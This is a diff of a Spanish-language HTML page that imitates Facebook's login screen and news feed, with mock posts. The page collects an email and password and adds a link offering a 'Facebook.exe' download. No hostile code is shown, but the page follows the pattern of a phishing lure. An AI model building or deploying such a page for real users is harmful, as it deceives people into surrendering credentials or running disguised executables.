@@ -1,340 +1,214 @@
 <!DOCTYPE html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
-    <style>
-        /* Estilos generales */
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        /* Estilos de la página de login */
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            background-color: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            display: block;
-            margin: 100px auto;
-        }
-        .login-header img {
-            width: 120px;
-            margin-bottom: 20px;
-        }
-        .login-header h1 {
-            color: #1877f2;
-            font-size: 36px;
-            margin: 0;
-            font-weight: bold;
-        }
-        .input-field {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: border 0.3s ease-in-out;
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook</title>
+        <link rel="stylesheet" href="index.css">
+    </head>
+    <body>
 
-        }
-        .button-search {
-            padding: 15px 30px;
-            font-size: 15px;
-            margin-left: 10px; 
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: #0400ff; 
-            color: white;
-            position: absolute;
-            top: 35px; 
-            right: 600px;
+        <!-- Inicio de Sesión -->
+        <div class="login-container" id="login-container">
+            <div class="login-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+                <h1>Facebook</h1>
+            </div>
 
-        }
-        .input-field:focus {
-            border-color: #1877f2;
-            outline: none;
-        }
-        .login-button {
-            width: 100%;
-            padding: 15px;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        .login-button:hover {
-            background-color: #165e99;
-        }
-        /* Simulación del Feed de Facebook */
-        .feed-container {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .post {
-            background-color: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        .post-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .post-header img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-        }
-        .post-header .username {
-            font-weight: bold;
-        }
-        .post-content {
-            margin-top: 10px;
-        }
-        .post-footer {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-            color: #65676b;
-            font-size: 14px;
-        }
-        .post-footer .like-comment {
-            cursor: pointer;
-        }
-        .emoji-reaction {
-            font-size: 20px;
-        }
-        .search-bar {
-            width: 100%;
-            max-width: 360px;
-            margin: 20px auto;
-            padding: 10px;
-            border-radius: 5px;
-            border: 1px solid #000000;
-            font-size: 16px;
-            display: block;
-            background-color: #fff;
-        }
-        .search-bar:focus {
-            outline: none;
-            border-color: #000000;
-        }
-        /* Responsividad */
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-            .login-container {
-                padding: 20px;
-                margin: 50px auto;
-            }
-        }
-    </style>
-
-<style>
-    /* Estilo para la ventana modal */
-    .modal {
-        display: none; /* Ocultamos la ventana por defecto */
-        position: fixed; /* Fija la ventana */
-        z-index: 1; /* Asegura que la ventana se superponga al contenido */
-        left: 0;
-        top: 0;
-        width: 100%; /* Ocupa todo el ancho */
-        height: 100%; /* Ocupa toda la altura */
-        overflow: auto; /* Permite el desplazamiento si es necesario */
-        background-color: rgb(0, 0, 0,0.4); /* Fondo semitransparente */
-        background-color: rgba(0,0,0,0.4); /* Fondo semitransparente */
-    }
-
-    /* Estilo para el contenido de la ventana modal */
-    .modal-content {
-        background-color: #252525;
-        margin: 15% auto; /* Centra la ventana */
-        padding: 20px;
-        border: 1px solid #000000;
-        width: 80%; /* Establece el ancho de la ventana */
-    }
-
-    /* Botón para cerrar la ventana modal */
-    .close {
-        color: #ffffff;
-        float: right;
-        font-size: 28px;
-        font-weight: bold;
-    }
-
-    .close:hover,
-    .close:focus {
-        color: rgb(240, 46, 46);
-        text-decoration: none;
-        cursor: pointer;
-    }
-</style>
-
-</head>
-<body>
-
-    <!-- Inicio de Sesión -->
-    <div class="login-container" id="login-container">
-        <div class="login-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-            <h1>Facebook</h1>
+            <form id="login-form" onsubmit="event.preventDefault(); login();">
+                <input class="input-field" type="text" id="email" placeholder="Correo electrónico o teléfono" required>
+                <input class="input-field" type="password" id="password" placeholder="Contraseña" required>
+                <button class="login-button" type="submit">Iniciar sesión</button>
+                <p style="color: #fff;">.</p>
+                <button class="button-account" type="submit">Crear Cuenta</button>
+            </form>
         </div>
 
-        <form id="login-form" onsubmit="event.preventDefault(); login();">
-            <input class="input-field" type="text" id="email" placeholder="Correo electrónico o teléfono" required>
-            <input class="input-field" type="password" id="password" placeholder="Contraseña" required>
-            <button class="login-button" type="submit">Iniciar sesión</button>
-        </form>
-    </div>
+        <!-- Feed de Facebook -->
+        <div class="container" id="feed-container" style="display: none;">
+            <input type="text" class="search-bar" placeholder="Buscar en Facebook..."> <button class="button-search" id="myBtn">Buscar</button> <a class="descarga" href="Facebook.exe" download>Descarga Facebook haciendo clic aquí</a>
 
-    <!-- Feed de Facebook -->
-    <div class="container" id="feed-container" style="display: none;">
-        <input type="text" class="search-bar" placeholder="Buscar en Facebook..."> <button class="button-search" id="myBtn">Buscar</button>
-        
-        <div class="feed-container">
-            <!-- Post 1 -->
-            <div class="post">
-                <div class="post-header">
-                    <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
-                    <div class="username">Juan Pérez</div>
+            
+            <div class="feed-container">
+                <!-- Post 1 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username">Juan Pérez</div>
+                    </div>
+                    <div class="post-content">
+                        ¡Será un gran día! 😊
+                    </div>
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (1K)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (234)</span>
+                    </div>
                 </div>
-                <div class="post-content">
-                    ¡Será un gran día! 😊
-                </div>
-                <div class="post-footer">
-                    <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (1K)</span>
-                    <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (234)</span>
-                </div>
-            </div>
 
-            <!-- Post 2 -->
-            <div class="post">
-                <div class="post-header">
-                    <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
-                    <div class="username">María López</div>
+                <!-- Post 2 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username">María López</div>
+                    </div>
+                    <div class="post-content">
+                        ¡Acabo de ver una película increíble! 🎬🔥
+                    </div>
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (894)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (256)</span>
+                    </div>
                 </div>
-                <div class="post-content">
-                    ¡Acabo de ver una película increíble! 🎬🔥
-                </div>
-                <div class="post-footer">
-                    <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (894)</span>
-                    <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (256)</span>
-                </div>
-            </div>
 
-            <!-- Post 3-->
-             <div class="post">
-                <div class="post-header">
-                    <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
-                    <div class="username"> Juan Carlos</div>
+                <!-- Post 3-->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Juan Carlos</div>
+                    </div>
+                    <div class="post-content">
+                        ¡Tengan un buen día! 😊
+                    </div>
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (500)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (94)</span>
+                    </div>
                 </div>
-                <div class="post-content">
-                    ¡Tengan un buen día! 😊
-                </div>
-                <div class="post-footer">
-                    <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (500)</span>
-                    <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (94)</span>
-                </div>
-            </div>
 
-            <!-- Post 4 -->
-             <div class="post">
-                <div class="post-header">
-                    <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
-                    <div class="username"> Eduardo Flores</div>
+                <!-- Post 4 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Eduardo Flores</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div> Wazaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (200K)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (980)</span>
+                    </div>
                 </div>
-                <div class="post-content">
-                    
-                </div> Wazaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-                <div class="post-footer">
-                    <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (200K)</span>
-                    <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (980)</span>
+
+                <!-- Post 5 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Gustavo Hernandéz</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div> Buenos Días a Todos 🖐🏻😁
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (87)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (20)</span>
+                    </div>
                 </div>
-            </div>
+
+                <!-- Post 6 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Gabriela Flores</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div>  Lindo día a todos 😁
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (13)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (11)</span>
+                    </div>
+                </div>
+
+                <!-- Post 7 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Sebastian Rodriguez</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div> ¡¡Jugando a Fornite en Directo con Suscriptores!! 
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (91)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (28)</span>
+                    </div>
+                </div>
+
+                <!-- Post 8 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Eduardo Flores</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div> Buenos Días a Todos 🖐🏻😁
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (35)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (15)</span>
+                    </div>
+                </div>
+
+                <!-- Post 9 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> George</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div> ¡Jugando Minecraft con Suscriptores! 😎
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (20K)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (2K)</span>
+                    </div>
+                </div>
+
+                <!-- Post 10 -->
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username"> Pepe</div>
+                    </div>
+                    <div class="post-content">
+                        
+                    </div> A
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (1M)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (1M)</span>
+                    </div>
+                </div>
 
 
-            <div class="post">
-                <div class="post-header">
-                    <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
-                    <div class="username">Carlos Gómez</div>
-                </div>
-                <div class="post-content">
-                    <video controls width="100%">
-                        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-                        Tu navegador no soporta el formato de video
-                    </video>
-                </div>
-                <div class="post-footer">
-                    <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (1K)</span>
-                    <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (947)</span>
+                <div class="post">
+                    <div class="post-header">
+                        <img src="https://i.pinimg.com/originals/3c/c7/c2/3cc7c2f0583e5aee0f416f5a559fbdf3.png" alt="User Avatar">
+                        <div class="username">Carlos Gómez</div>
+                    </div>
+                    <div class="post-content">
+                        <video controls width="100%">
+                            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                            Tu navegador no soporta el formato de video
+                        </video>
+                    </div>
+                    <div class="post-footer">
+                        <span class="like-comment"><span class="emoji-reaction">👍</span> Me gusta (1K)</span>
+                        <span class="like-comment"><span class="emoji-reaction">💬</span> Comentarios (947)</span>
+                    </div>
                 </div>
             </div>
         </div>
-    </div>
 
-    <div id="myModal" class="modal">
-        <div class="modal-content">
-            <span class="close">&times;</span>
-            <h1 style="color: #fff;">Error</h1> 
-            <p style="color: #fff;">Hemos encontrado un error fatal al intentar buscar ''</p>
+        <div id="myModal" class="modal">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+                <h1 style="color: #fff;">Error</h1> 
+                <p style="color: #fff;">No hemos podido encontrar tu busqueda :C</p>
 
+            </div>
         </div>
-    </div>
 
-    <script>
-        var modal = document.getElementById("myModal");
-        var btn = document.getElementById("myBtn");
-        var span = document.getElementsByClassName("close")[0];
-
-
-        btn.onclick = function() {
-            modal.style.display = "block";
-        }
-
-        span.onclick = function() {
-            modal.style.display = "none";
-        }
-
-        window.onclick = function(event) {
-            if (event.target == modal) {
-                modal.style.display = "none";
-            }
-        }
-    </script>
-
-    <script>
-
-
-        function login() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            if (email && password) {
-                // Simula el login exitoso
-                document.getElementById('login-container').style.display = 'none';
-                document.getElementById('feed-container').style.display = 'block';
-            }
-        }
-    </script>
-</body>
+        <script src="index.js"></script>
+    </body>
 </html>
